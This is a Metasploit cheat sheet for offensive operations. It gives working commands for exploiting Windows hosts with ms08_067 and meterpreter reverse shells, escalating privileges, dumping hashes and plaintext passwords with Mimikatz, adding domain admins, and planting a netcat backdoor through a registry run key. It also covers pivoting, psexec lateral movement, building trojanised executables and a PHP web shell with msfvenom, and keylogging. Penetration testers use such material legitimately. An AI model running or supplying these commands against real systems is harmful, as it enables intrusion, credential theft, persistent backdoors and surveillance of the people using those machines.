Metasploit


# OS X

No MacPorts or Homebrew needed.
Download the latest installer and run: http://osx.metasploit.com
Answer yes to all the questions.
sudo chown -R <username> /opt/metasploit-framework/
sudo chown -R <username> /Users/<username>/.msf4/
/opt/metasploit-framework/msfdb init
/opt/metasploit-framework/bin/msfconsole

msf > db_status 
[*] postgresql connected to msf
msf > db_rebuild_cache 
[*] Purging and rebuilding the module cache in the background...

Wait about 3 min.
msf > search ms15             Show all Microsoft exploits released in 2015.
------------------------------------------------------------------------------------------------------

service postgrsql start       Start the PostreSQL db.
msfconsole                    Start Metasploit.
msf > db_status               Check that you are connected to the db.
------------------------------------------------------------------------------------------------------

# If the db connection fails:
msf > exit
msfdb init
msfconsole
msf > db_status

If the db connection still fails, create new user and db:
msf > exit
su postgres
postgres@kali:~$ createuser <username> -P
Enter password for new role: 
Enter it again: 
postgres@kali:~$ createdb --owner=<username> msf
postgres@kali:~$ exit

# Autoconnect to db

nano ~/.msf4/database.yml
production:
    adapter: postgresql
    database: msf
    username: <username>
    password: <password>
    host: 127.0.0.1
    port: 5432
    pool: 5
    timeout: 5

# Module database cache not built yet, using slow search
db_rebuild_cache              Rebuilds the database-stored module cache
------------------------------------------------------------------------------------------------------

help or ?                     Show available commands and their descriptions.
show -h                       Show help on the 'show' command.
------------------------------------------------------------------------------------------------------

# Basic exploit

search ms08                   Show all Microsoft exploits released in 2008.

use exploit/windows/smb/ms08_067_netapi
show targets                  Show various OSs that can be targeted with this exploit.
show payloads                 Show all payloads that work with this exploit.
set PAYLOAD windows/meterpreter/reverse_tcp
show options                  Show remainging options for the payload.
set LHOST <attacker IP>       Set the listner to the attacker's IP.
set LPORT 443                 Set the listening port to 443.
exploit                       Run the exploit.
sessions -l                   List all active sessions.
------------------------------------------------------------------------------------------------------

# Cross platform exploit

- Windows
use exploit/multi/script/web_delivery
set LHOST <attacker IP>
set LPORT 443
show TARGETS                  Show all targets.
set TARGET 2                  Set the target language to Powershell.
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

- Linux and OS X
use exploit/multi/script/web_delivery
set LHOST <attacker IP>
set LPORT 443
set TARGET 0                  Set the target language to Python.
set PAYLOAD python/meterpreter/reverse_tcp
exploit
------------------------------------------------------------------------------------------------------

# Sessions

sessions -h
Usage: sessions [options]

Active session manipulation and interaction.

OPTIONS:

    -K        Terminate all sessions
    -c <opt>  Run a command on the session given with -i, or all
    -h        Help banner
    -i <opt>  Interact with the supplied session ID   
    -k <opt>  Terminate sessions by session ID and/or range
    -l        List all active sessions
    -q        Quiet mode
    -r        Reset the ring buffer for the session given with -i, or all
    -s <opt>  Run a script on the session given with -i, or all
    -t <opt>  Set a response timeout (default: 15)
    -u <opt>  Upgrade a shell to a meterpreter session on many platforms
    -v        List sessions in verbose mode
    -x        Show extended information in the session table


Many options allow specifying session ranges using commas and dashes.

For example:
   sessions -s checkvm -i 1,3-5
   sessions -k 1-2,5,6

sessions -l                                   Show active sessions.
sessions -i 2                                 Interact with session 2.
------------------------------------------------------------------------------------------------------

# Post Exploitation with Meterpreter

migrate                                       Migrate the server to another process.
sysinfo                                       Gets information about the remote system, such as OS.
getuid                                        Get the user that the server is running as.

# Escalate Privileges

getsystem                                     Attempt to elevate your privilege to that of local system. If this fails containue.
background                                    Backgrounds the current session.

Option 1:
use exploit/windows/local/bypassuac_vbs
set session <#>                               
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker IP>
set LPORT 4444                                This MUST be a different port from what was used in the original exploit.
exploit

Option 2:
use post/windows/escalate/getsystem

migrate
getuid
getsystem
getuid                                        Privileges should now be NT AUTHORITY\SYSTEM.

Other options:
use post/windows/escalate/droplnk
use exploit/windows/local/service_permissions
use exploit/windows/local/trusted_service_path
use exploit/windows/local/ppr_flatten_rec
use exploit/windows/local/ms_ndproxy
use exploit/windows/local/ask
------------------------------------------------------------------------------------------------------

# Dump hashes & passwords

hashdump                                      Try to dump password hashes. If this fails continue.
ps                                            Show running processes.
migrate <pid>                                 Migrate to a specific process running as NT AUTHORITY\SYSTEM.
hashdump
run post/windows/gather/credentials/credential_collector

load kiwi                                     Mimikatz
lsa_dump                                      Show the current user password in plain text.
creds_all                                     Show all user passwords in plain text.
wifi_list                                     Show all wireless networks that have been connected and passwords.

# Domain Controller

use/post/windows/gather/credentials/domain_hashdump
------------------------------------------------------------------------------------------------------

# Persistance

add_user <user> <password> -h <target IP>
add_group_user "Domain Admins" <user> -h <target IP>
------------------------------------------------

run persistence -h

run persistence <starts at computer startup> <tries to connect every 30s> <port 443> <attacker IP>

run persistence -X -i 30 -p 443 -r <target IP>

Notice that it shows where the file is stored on the Windows machine.
It also gives you the location of the Meterpreter resource file you can run to remove persistence.

Example 2:
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker IP>
set LPORT 443
set ExitOnSession false
set AutoRunScript persistence -X -i 30 -p 443 -r <target IP>
exploit -j -z
------------------------------------------------

Scheduled persistence

msf > info exploit/windows/local/s4u_persistence

Notice the trigger methods: event, lock, logon, schedule, unlock

msf > use exploit/windows/local/s4u_persistence
msf > set session 1
msf > set TRIGGER lock
msf > exploit
------------------------------------------------

Volume Shadow Copy persistence

msf > use exploit/windows/local/vss_persistence
msf > set session 1
msf > set RHOST 172.16.181.140
msf > set LPORT 4445  <———use a different port number
msf > exploit
------------------------------------------------

Upload netcat.
meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32\\

Check for anything the runs at startup.
meterpreter > reg enumkey -k HKLM\\software\\windows\\currentversion\\run

Add a registry key.
meterpreter > reg setval -k HKLM\\software\\windows\\currentversion\\run -v netcat -d ‘c:\windows\system32\nc.exe -ldp 443 -e cmd.exe'

Verify changes to the registry.
meterpreter > reg queryval -k HKLM\\software\\windows\\currentversion\\run -v netcat

Reboot the target system.
meterpreter >  reboot

Connect to target system - option 1
Open a new Terminal: nc -vn <target IP> 443

Connect to target system - option 2
use multi/handler
set PAYLOAD windows/shell_bind_tcp
set RHOST <target IP>
exploit
------------------------------------------------------------------------------------------------------

# Tokens

use incognito
list_tokens -u
list_tokens -g
impersonate_token <domain>\\<user>
------------------------------------------------------------------------------------------------------

# Upload tools

upload <local path> <remote path>
upload /usr/share/windows-binaries/nc.exe c:\\
------------------------------------------------------------------------------------------------------

# Lateral movement

use windows/smb/psexec
set SMBUser <user name>
set SMBPass <user name hash from another target>
set RHOST <target IP>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker IP>
set LPORT 443
exploit
------------------------------------------------------------------------------------------------------

# Pivoting

ipconfig                                      Look for dual-homed connections.
192.168.0.10
255.255.255.0
 
10.0.0.5
255.255.255.0

run arp_scanner -r 10.10.10.1/24
10.0.0.1
10.0.0.2
10.0.0.5
10.0.0.20

meterpreter > background
route add 10.0.0.1 255.255.255.0 x            Where x is the meterpreter session ID.
route print                                   Verify the new route.

use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
set PORTS 445
set THREADS 10
run
------------------------------------------------------------------------------------------------------

# msfvenom

msfvenom -p <payload variable=value> -f <format> -a <arch> --platform <OS platform> -o <output file>

Generate a reverse payload and save as an executable:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.7 LPORT=443 -f exe -a x86_64 —platform windows -o /root/payload64.exe

Generate a bind payload that avoids a bad character:
msfvenom -p windows/meterpreter/bind_tcp -b '\x00'

Generate a bind payload and encode it 3 times:
msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3

Inject a bind payload into calc.exe and save it as an executable: 
msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > calc2.exe
------------------------------------------------

Generate PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -a php -e php/base64 -f raw -o webshell.php

Upload the file to a web server: /var/www/

use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 443
exploit

Access the shell on the remote web server.
firefox http://<tartget URL>/webshell.php
------------------------------------------------------------------------------------------------------

# Database

msf > help database

Database Backend Commands
=========================

    Command                   Description
    -------                   -----------
    creds                     List all credentials in the database
    db_connect                Connect to an existing database
    db_disconnect             Disconnect from the current database instance
    db_export                 Export a file containing the contents of the database
    db_import                 Import a scan result file (filetype will be auto-detected)
    db_nmap                   Executes nmap and records the output automatically
    db_rebuild_cache          Rebuilds the database-stored module cache
    db_status                 Show the current database status
    hosts                     List all hosts in the database
    loot                      List all loot in the database
    notes                     List all notes in the database
    services                  List all services in the database
    vulns                     List all vulnerabilities in the database
    workspace                 Switch between database workspaces

services -p 22                List specific ports.
services -s http              List specific services.

workspace                     List workspaces.
* default                     * shows the active workspace.
  client1
  client5

workspace client1             Switch workspace.

workspace                     List workspaces.
  default
* client1                     * shows the active workspace.
  client5

workspace -a <name>           Add workspace(s).
workspace -d <name>           Delete workspace(s).
workspace -r <old> <new>      Rename workspace.
------------------------------------------------------------------------------------------------------

# Misc

idletime                                      Returns the number of seconds the remote user has been idle.
     if time < 5 min
     keyscan_start                            Start capturing keystrokes.
     keyscan_stop                             Stop capturing keystrokes.
     keyscan_dump                             Dump the keystroke buffer.

screenshot                                    Grab a screenshot of the interactive desktop

run vnc
     if the screen is locked exit VNC
     run screen_unlock
